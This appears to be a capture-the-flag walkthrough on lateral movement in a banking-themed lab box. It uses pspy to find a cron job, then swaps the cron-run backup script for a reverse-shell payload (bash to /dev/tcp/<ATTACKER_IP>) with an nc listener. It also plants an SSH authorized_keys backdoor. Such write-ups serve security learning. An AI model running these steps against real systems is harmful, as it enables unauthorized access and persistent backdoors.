The session began with a quick recap of the previous part: finding SSH credentials for `layne.stanley `via SNMP, and enumerating two key files/directories referenced in the `bankSmarter_backup.sh` script:`/tmp/bank_exports` and `/etc/bank_api_keys/transactions_api.key`.

| **Command**               | **Finding/Observation**                                                                              |
| ------------------------- | ---------------------------------------------------------------------------------------------------- |
| ls -la                    | Confirmed bankSmarter_backup.sh is in the home directory, but owned by another user (scott.weiland). |
| ./bankSmarter_backup.sh   | Fails due to "permission denied" when trying to create a directory.                                  |
| ls -la /etc/bank_api_keys | The directory does not exist.                                                                        |
| ls -la /tmp/bank_exports  | The directory exists, is owned by scott.weiland, but is **empty**.                                   |
| ls -la /opt               | Discovered an interesting directory: **bank**.                                                       |
| ls -la /opt/bank          | Permission is **denied**. The directory is owned by root and the **bank-team** group.                |
| id                        | Confirmed the current user is not in the bank-team group.                                            |

### Identifying a Cron Job via pspy
A potential attack path was identified as abusing a script running on a timed interval (cron job).
#### Download pspy64:
Set up a web server on the Kali machine (e.g., HTTP server port 80).

- Download the binary to a writable directory on the target (e.g., /tmp):
```
wget http://<ATTACKER_IP>/pspy64  
```

- Make pspy64 Executable:
```
chmod +x pspy64  
```
- Run pspy:
```
./pspy64  
```

- **Observation**: The output confirmed a script was running at a regular interval.

```bash
2025/10/30 17:25:01 CMD: UID=0     PID=1926   | /usr/sbin/CRON -f -P 
2025/10/30 17:25:01 CMD: UID=0     PID=1925   | /usr/sbin/CRON -f -P 
2025/10/30 17:25:01 CMD: UID=0     PID=1927   | /usr/sbin/CRON -f -P 
2025/10/30 17:25:01 CMD: UID=0     PID=1928   | /usr/sbin/CRON -f -P 
2025/10/30 17:25:01 CMD: UID=1002  PID=1930   | 
2025/10/30 17:25:01 CMD: UID=1002  PID=1931   | bash /home/layne.stanley/bankSmarter_backup.sh 
2025/10/30 17:25:01 CMD: UID=1002  PID=1932   | 
2025/10/30 17:25:01 CMD: UID=1002  PID=1933   | 
2025/10/30 17:26:01 CMD: UID=0     PID=1934   | /usr/sbin/CRON -f -P 
2025/10/30 17:26:01 CMD: UID=0     PID=1936   | /usr/sbin/CRON -f -P 
2025/10/30 17:26:01 CMD: UID=1002  PID=1937   | /bin/sh -c bash /home/layne.stanley/bankSmarter_backup.sh 
2025/10/30 17:26:01 CMD: UID=1002  PID=1938   | bash /home/layne.stanley/bankSmarter_backup.sh 
2025/10/30 17:26:01 CMD: UID=1002  PID=1939   | 
2025/10/30 17:26:01 CMD: UID=1002  PID=1940   | bash /home/layne.stanley/bankSmarter_backup.sh 

```

- The command running was: `/bin/bash /home/layne.stanley/bankSmarter_backup.sh`
- The script was running as `UID 1002`.
- Identify the User ID (UID):
	Check `/etc/passwd `to map the `UID` to a username:

```bash
grep 1002 /etc/passwd  
```
- UID 1002 corresponds to user scott.weiland.

---

#### Compromising `scott.weiland`
The script is executed as` scott.weiland` from the layne.stanley home directory. Although layne.stanley does not have write permissions to the file itself, the user owns the directory, which allows the file to be renamed and replaced.

Rename the Original Script:
mv bankSmarter_backup.sh bankSmarter_backup_old.sh  
Create a Malicious Script (Reverse Shell):
Create a new bankSmarter_backup.sh to get a reverse shell.
nano banksmarter_backup.sh  
# Inside the file, add the payload:  

```bash
#!/bin/bash  
bash -i >& /dev/tcp/<ATTACKER_IP>/1337 0>&1  
```

Set Up Listener and Wait:
On the Kali machine:
```bash
nc -nvlp 1337  
```
After waiting for the cron job to run, a shell was received as scott.weiland.
Enumerating as scott.weiland
To get a more stable shell, an SSH backdoor was set up using an authorized key.

Create the .ssh Directory (if it doesn't exist):
```
mkdir .ssh  
```
Add Public Key to authorized_keys:
Generate an SSH key on the attacker machine (ssh-keygen -t ed25519) and grab the public key (cat ~/.ssh/id_ed25519.pub).
On the target shell as scott.weiland:
cd .ssh  
```
echo "<YOUR_PUBLIC_KEY>" > authorized_keys  
```
Establish Stable SSH Shell:
```
ssh scott.weiland@<TARGET_IP>  
```
Post-Exploitation Enumeration as scott.weiland
Check User and Groups:

```bash
scott.weiland@ip-10-1-207-165:~$ id
uid=1002(scott.weiland) gid=1002(scott.weiland) groups=1002(scott.weiland),1003(ronnie.stone),1005(tmuxshare),1006(tmuxusers),1007(tmuxshared),1008(bank-team)

```

Unique Groups found: 
- ronnie.stone
- various tmux groups, and critically, bank-team.

- Check sudo Permissions:
```
sudo -l  
```

Password is required, which is unknown.